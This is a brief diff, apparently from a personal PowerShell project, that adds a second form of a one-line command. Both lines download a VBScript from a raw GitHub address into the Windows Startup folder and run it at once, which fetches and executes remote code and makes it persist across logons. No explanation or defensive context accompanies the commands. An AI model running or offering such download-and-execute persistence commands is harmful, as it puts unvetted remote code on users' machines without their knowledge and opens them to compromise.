@@ -1,1 +1,3 @@
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs -OutFile ($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs'); Set-Location -Path ($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup'); .\avvio.vbs"
+
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs -OutFile ($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs'); .($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs')"
